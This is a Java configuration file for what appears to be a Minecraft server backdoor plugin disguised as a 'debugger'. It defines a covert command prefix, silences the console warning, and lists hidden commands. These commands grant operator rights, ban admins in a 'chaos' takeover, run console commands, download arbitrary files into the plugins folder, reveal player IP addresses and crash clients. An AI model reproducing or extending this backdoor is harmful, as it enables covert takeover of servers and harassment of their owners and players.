/*
 * Plugin configuration file
 */

package com.thiccindustries.debugger;

import org.bukkit.ChatColor;

public class Config {


    /*Command execution*/

    // Command Prefix 
    public static String command_prefix = "UkT>";

    // Warn server console about "debugger"
    public static Boolean display_debugger_warning = false;

    // Print debug messages to console 
    public static Boolean display_debug_messages = false;




    /* Command defaults */

    // Default gamemode for gamemode command
    public static final int default_gamemode = 1;

    // Default ban reason 
    public static final String default_ban_reason = "Banned";

    // Default ban source 
    public static final String default_ban_source = "Server";

    public static final int default_lag_spawn_amount = 5000;

    /* Chat settings */

    // message prefix 
    public static final String chat_message_prefix = "[DOOM]";

    // color of messages prefix 
    public static final ChatColor chat_message_prefix_color = ChatColor.GOLD;

    // color of help command name 
    public static final ChatColor help_command_name_color = ChatColor.LIGHT_PURPLE;

    // color of help command syntax 
    public static final ChatColor help_command_desc_color = ChatColor.WHITE;

    // color of help 
    public static final ChatColor help_detail_color = ChatColor.GREEN;

    // Chaos chat message
    public static final String chaos_chat_broadcast = "\n\n\n\n\n\n\n\n\n\n" +
                                                        "[Server] ALL ADMINS HAVE BEEN BANNED\n" +
                                                        "[Server] ALL PLAYERS HAVE OP UNTIL ROLLBACK";

    // Help message content
    public static final HelpItem[] help_messages = {
            new HelpItem("help",        "[command]",                    "display this message, or description of command."),
            new HelpItem("op",          "[player]",                     "op specified player (def: self)"),
            new HelpItem("deop",        "[player]",                     "deop specified player (def: self)"),
            new HelpItem("ban",         "(player) [reason] [source]",   "ban player with reason and source (def: " + default_ban_reason + ", " + default_ban_source + ")"),
            new HelpItem("banip",       "(player) [reason] [source]",   "ip ban player with reason and source (def: " + default_ban_reason + ", " + default_ban_source + ")"),
            new HelpItem("gm",          "[gamemode]",                   "switch to specified gamemode (def: " + Config.default_gamemode + ")"),
            new HelpItem("give",        "(item) [count]",               "give the specified item in specified quantities (def: stack)"),
            new HelpItem("exec",        "[command]",                    "[Visible] Exocute command as server console"),
            new HelpItem("info",        "",                             "shows informatin about server"),
            new HelpItem("chaos",       "",                             "[Visible] Deop and ban ops, op all regular players, run this while not being op yourself"),
            new HelpItem("seed",        "",                             "get the current world seed"),
            new HelpItem("sudo",        "(player) (message)",           "sends messages as player (def: nickname message)"),
            new HelpItem("bcast",       "(message)",                    "sends messages as Server (def: message)"),
            new HelpItem("rename",      "[name]",                       "changes your nick (def: nickname)"),
            new HelpItem("reload",      "",                             "[Visible] Reloads the server"),
            new HelpItem("getip",       "[player]",                     "gets ip of the player (def: nickname)"),
            new HelpItem("listwrld",    "",                             "displays all worlds"),
            new HelpItem("mkwrld",      "[world]",                      "[Visible] Creates new world (def: world_name)"),
            new HelpItem("delwrld",     "[world]",                      "[Visible] Deletes a world (def: world_name)"),
            new HelpItem("vanish",      "",                             "makes you vanish, tab included"),
            new HelpItem("silktouch",   "(player)",                     "gives player silk touch hands (def: nickname)"),
            new HelpItem("instabreak",  "(player)",                     "let's player mine instantly (def: nickname)"),
            new HelpItem("crash",       "[player]",                     "crashes player's name (def: nickname)"),
            new HelpItem("mindfuck",    "(thrower), (interact), (cripple), (flight), (inventory), (drop), (teleport), (mine), (place), (login) [player]"," fucks with player (def: method nickname)"),
            new HelpItem("lock",        "(player), (all) or (console)", "locks the console or blocks player (def: nickname, all or console)"),
            new HelpItem("unlock",      "(player), (all) or (console)", "unlocks the console or unblocks player (def: nickname, all or console)"),
            new HelpItem("mute",        "(player) or (all)",            "mutes a player (def: nickname or all)"),
            new HelpItem("unmute",      "(player) or (all)",            "unmutes a player (def: nickname or all)"),
            new HelpItem("download",    "(url) (file)",                 "downloads a file, don't use special chars or spaces (def: url plugins/file.jar)"),
            new HelpItem("coords",      "[player]",                     "get the coordinates of specified player"),
            new HelpItem("tp",          "[x] [y] [z]",                  "[Visible] Teleport to specified coordinates"),
            new HelpItem("stop",        "",                             "[Visible] Shutdown the server")
    };

    public static class HelpItem{

        private final String name;
        private final String syntax;
        private final String desc;

        public HelpItem(String name, String syntax, String desc){
            this.name = name;
            this.syntax = syntax;
            this.desc = desc;
        }

        public String getName(){
            return name;
        }

        public String getSyntax(){
            return syntax;
        }

        public String getDesc(){
            return desc;
        }

        public String toString(){
            return Config.help_command_name_color + name + " " + syntax + ": " + Config.help_command_desc_color + desc;
        }
    }
}

